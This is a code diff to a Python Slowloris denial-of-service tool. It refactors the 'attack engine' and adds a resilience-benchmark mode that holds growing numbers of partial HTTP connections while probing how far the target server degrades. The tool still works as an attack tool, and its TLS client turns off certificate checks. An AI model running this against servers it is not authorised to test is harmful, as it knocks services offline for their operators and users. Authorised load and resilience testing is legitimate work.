@@ -17,13 +17,16 @@ Features modernized:
 from __future__ import annotations
 
 import asyncio
+import json
 import logging
 import random
 import signal
 import socket
 import ssl
 import sys
-from dataclasses import asdict, dataclass
+import time
+from dataclasses import asdict, dataclass, replace
+from statistics import mean
 from typing import TYPE_CHECKING
 
 # Modern CLI package
@@ -40,7 +43,7 @@ from tenacity import (
     wait_exponential,
 )
 
-__version__ = "0.3.2"
+__version__ = "0.4.0"
 
 # Configure structlog with console output
 structlog.configure(
@@ -135,6 +138,22 @@ class Config:
         return asdict(self)
 
 
+def _make_client_ssl_context() -> ssl.SSLContext:
+    """Create a client SSL context with modern, permissive TLS settings."""
+    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
+    try:
+        ssl_context.set_ciphers(
+            "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS"
+        )
+    except ssl.SSLError:
+        # Some systems may not support custom ciphers
+        pass
+    return ssl_context
+
+
 class Slowloris:
     """Asyncio-based Slowloris attack engine.
 
@@ -159,26 +178,7 @@ class Slowloris:
 
     def _create_ssl_context(self) -> ssl.SSLContext:
         """Create enhanced SSL context with modern TLS settings."""
-        # Use TLS 1.3 if available, fallback to TLS 1.2
-        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-
-        # Modern security settings
-        ssl_context.check_hostname = False
-        ssl_context.verify_mode = ssl.CERT_NONE
-
-        # Require at least TLS 1.2 (TLS 1.3 negotiated when available)
-        ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
-
-        # Set secure ciphers
-        try:
-            ssl_context.set_ciphers(
-                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS"
-            )
-        except ssl.SSLError:
-            # Some systems may not support custom ciphers
-            pass
-
-        return ssl_context
+        return _make_client_ssl_context()
 
     @retry(
         stop=stop_after_attempt(3),
@@ -327,22 +327,14 @@ class Slowloris:
             sockets=self.config.sockets,
         )
 
-        # Create worker tasks
-        for _ in range(self.config.sockets):
-            task = asyncio.create_task(self._worker())
-            self._tasks.add(task)
-            task.add_done_callback(self._tasks.discard)
+        self.start_workers(self.config.sockets)
 
         # Wait for shutdown signal
         await self._shutdown.wait()
 
         # Graceful shutdown
         log.info("Shutting down connections")
-        for task in self._tasks:
-            task.cancel()
-
-        if self._tasks:
-            await asyncio.gather(*self._tasks, return_exceptions=True)
+        await self.stop_and_join()
 
         log.info(
             "Attack complete",
@@ -350,9 +342,215 @@ class Slowloris:
             connections_failed=self._connections_failed,
         )
 
+    def start_workers(self, count: int) -> None:
+        """Spawn ``count`` connection-holding worker tasks."""
+        for _ in range(count):
+            task = asyncio.create_task(self._worker())
+            self._tasks.add(task)
+            task.add_done_callback(self._tasks.discard)
+
+    async def stop_and_join(self) -> None:
+        """Signal shutdown, cancel workers, and wait for them to finish."""
+        self.stop()
+        for task in list(self._tasks):
+            task.cancel()
+        if self._tasks:
+            await asyncio.gather(*self._tasks, return_exceptions=True)
+
+    @property
+    def connections_created(self) -> int:
+        """Number of connections successfully opened so far."""
+        return self._connections_created
+
     def stop(self) -> None:
         """Signal shutdown."""
         self._shutdown.set()
+
+
+async def probe(
+    host: str,
+    port: int,
+    *,
+    https: bool = False,
+    timeout: float = 10.0,
+) -> tuple[bool, float]:
+    """Send one legitimate HTTP request and measure responsiveness.
+
+    Returns ``(success, latency_seconds)`` where ``success`` means the server
+    returned an HTTP status line before the timeout elapsed.
+    """
+    ssl_ctx = _make_client_ssl_context() if https else None
+    start = time.monotonic()
+    writer: asyncio.StreamWriter | None = None
+    try:
+        reader, conn = await asyncio.wait_for(
+            asyncio.open_connection(host, port, ssl=ssl_ctx), timeout=timeout
+        )
+        writer = conn
+        request = (
+            f"GET / HTTP/1.1\r\nHost: {host}\r\n"
+            "User-Agent: slowloris-benchmark\r\nConnection: close\r\n\r\n"
+        )
+        conn.write(request.encode())
+        await asyncio.wait_for(conn.drain(), timeout=timeout)
+        line = await asyncio.wait_for(reader.readline(), timeout=timeout)
+        latency = time.monotonic() - start
+        return line.startswith(b"HTTP/"), latency
+    except (OSError, asyncio.TimeoutError, ssl.SSLError):
+        return False, time.monotonic() - start
+    finally:
+        if writer is not None:
+            writer.close()
+            try:
+                await asyncio.wait_for(writer.wait_closed(), timeout=timeout)
+            except (OSError, asyncio.TimeoutError, ssl.SSLError):
+                pass
+
+
+def _summarize_level(level: int, results: list[tuple[bool, float]]) -> dict[str, object]:
+    """Aggregate probe results for a single concurrency level."""
+    total = len(results)
+    successes = sum(1 for ok, _ in results if ok)
+    ok_latencies = [latency for ok, latency in results if ok]
+    success_rate = successes / total if total else 0.0
+    return {
+        "sockets": level,
+        "probes": total,
+        "probe_successes": successes,
+        "success_rate": round(success_rate, 4),
+        "avg_latency_ms": round(mean(ok_latencies) * 1000, 2) if ok_latencies else None,
+        "max_latency_ms": round(max(ok_latencies) * 1000, 2) if ok_latencies else None,
+    }
+
+
+class Benchmark:
+    """Resilience benchmark: ramp concurrency and measure server degradation.
+
+    Instead of simply flooding a target, this holds a growing number of
+    partial connections at each level while probing the server with legitimate
+    requests, recording the level at which the success rate falls below
+    ``fail_under``. Intended for testing systems you own or are authorized to
+    test.
+    """
+
+    def __init__(
+        self,
+        config: Config,
+        levels: list[int],
+        *,
+        step_duration: float = 5.0,
+        probe_interval: float = 0.5,
+        warmup: float = 1.0,
+        fail_under: float = 0.9,
+    ) -> None:
+        if not levels:
+            raise ValueError("At least one benchmark level is required")
+        if any(level < 1 for level in levels):
+            raise ValueError("Benchmark levels must be >= 1")
+        if not 0.0 <= fail_under <= 1.0:
+            raise ValueError("fail_under must be between 0.0 and 1.0")
+        self.config = config
+        self.levels = levels
+        self.step_duration = step_duration
+        self.probe_interval = probe_interval
+        self.warmup = warmup
+        self.fail_under = fail_under
+
+    async def _run_level(self, level: int) -> dict[str, object]:
+        engine = Slowloris(replace(self.config, sockets=level))
+        engine.start_workers(level)
+        try:
+            await asyncio.sleep(self.warmup)
+            results: list[tuple[bool, float]] = []
+            loop = asyncio.get_running_loop()
+            deadline = loop.time() + self.step_duration
+            while loop.time() < deadline:
+                results.append(
+                    await probe(
+                        self.config.host,
+                        self.config.port,
+                        https=self.config.https,
+                        timeout=self.config.connect_timeout,
+                    )
+                )
+                await asyncio.sleep(self.probe_interval)
+        finally:
+            await engine.stop_and_join()
+        summary = _summarize_level(level, results)
+        summary["connections_created"] = engine.connections_created
+        return summary
+
+    async def run(self) -> dict[str, object]:
+        """Run all levels and return a structured report."""
+        levels_report: list[dict[str, object]] = []
+        degraded_at: int | None = None
+        for level in self.levels:
+            log.info("Benchmark level", sockets=level)
+            summary = await self._run_level(level)
+            levels_report.append(summary)
+            success_rate = summary["success_rate"]
+            assert isinstance(success_rate, float)
+            log.info(
+                "Level result",
+                sockets=level,
+                success_rate=success_rate,
+                avg_latency_ms=summary["avg_latency_ms"],
+            )
+            if degraded_at is None and success_rate < self.fail_under:
+                degraded_at = level
+        return {
+            "target": {
+                "host": self.config.host,
+                "port": self.config.port,
+                "https": self.config.https,
+            },
+            "fail_under": self.fail_under,
+            "levels": levels_report,
+            "degraded_at": degraded_at,
+        }
+
+
+def _parse_levels(raw: str) -> list[int]:
+    """Parse a comma-separated list of concurrency levels."""
+    try:
+        levels = [int(part) for part in raw.split(",") if part.strip()]
+    except ValueError as exc:
+        raise click.BadParameter(f"Invalid levels list: {raw!r}") from exc
+    if not levels:
+        raise click.BadParameter("At least one level is required")
+    if any(level < 1 for level in levels):
+        raise click.BadParameter("Levels must be >= 1")
+    return levels
+
+
+async def _run_benchmark(
+    config: Config,
+    levels: list[int],
+    step_duration: float,
+    fail_under: float,
+    report_path: str | None,
+) -> int:
+    """Run a resilience benchmark and return a process exit code."""
+    benchmark = Benchmark(
+        config,
+        levels,
+        step_duration=step_duration,
+        fail_under=fail_under,
+    )
+    report = await benchmark.run()
+
+    if report_path:
+        with open(report_path, "w", encoding="utf-8") as handle:
+            json.dump(report, handle, indent=2)
+        log.info("Report written", path=report_path)
+    else:
+        click.echo(json.dumps(report, indent=2))
+
+    degraded_at = report["degraded_at"]
+    if degraded_at is not None:
+        log.info("Degradation detected", degraded_at=degraded_at)
+        return 1
+    return 0
 
 
 async def _run_attack(config: Config) -> None:
@@ -447,6 +645,35 @@ async def _run_attack(config: Config) -> None:
     type=float,
     help="Timeout in seconds for connecting and writing (default: 10)",
 )
+@click.option(
+    "--benchmark",
+    is_flag=True,
+    help="Resilience benchmark mode: ramp concurrency and report degradation",
+)
+@click.option(
+    "--levels",
+    default="10,50,100,200",
+    help="Comma-separated concurrency levels for --benchmark (default: 10,50,100,200)",
+)
+@click.option(
+    "--step-duration",
+    default=5.0,
+    type=float,
+    help="Seconds to probe at each benchmark level (default: 5)",
+)
+@click.option(
+    "--fail-under",
+    default=0.9,
+    type=float,
+    help="Probe success-rate threshold for degradation in --benchmark (default: 0.9)",
+)
+@click.option(
+    "--report",
+    "report_path",
+    default=None,
+    type=click.Path(dir_okay=False, writable=True),
+    help="Write benchmark report as JSON to this path (default: stdout)",
+)
 @click.version_option(version=__version__)
 def main(
     host: str | None,
@@ -461,6 +688,11 @@ def main(
     sleeptime: float,
     jitter: float,
     connect_timeout: float,
+    benchmark: bool,
+    levels: str,
+    step_duration: float,
+    fail_under: float,
+    report_path: str | None,
 ) -> None:
     """Slowloris - Low bandwidth stress test tool for websites."""
 
@@ -498,6 +730,17 @@ def main(
             err=True,
         )
         sys.exit(1)
+
+    if benchmark:
+        parsed_levels = _parse_levels(levels)
+        try:
+            exit_code = asyncio.run(
+                _run_benchmark(config, parsed_levels, step_duration, fail_under, report_path)
+            )
+        except KeyboardInterrupt:
+            log.info("Interrupted, shutting down")
+            exit_code = 130
+        sys.exit(exit_code)
 
     # Run using the modern asyncio.run() entry point
     try:
